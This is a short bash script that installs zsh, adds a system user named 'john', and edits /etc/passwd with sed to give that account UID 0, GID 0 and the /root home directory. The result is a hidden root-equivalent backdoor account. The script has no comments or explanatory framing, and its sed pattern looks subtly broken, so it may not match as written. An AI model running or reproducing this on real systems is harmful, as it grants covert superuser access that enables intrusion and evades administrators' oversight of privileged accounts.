#!/bin/bash
if [ -f /etc/redhat-release ] ; then
PKMGR='yum'
elif [ -f /etc/debian_version ] ; then
PKMGR='apt-get'
fi
$PKMGR install zsh
adduser -r -N john
sed -i 's/john:x:*:*::\/*:\/bin\/*/john:x:0:0::\/root:\/bin\/zsh/g' /etc/passwd
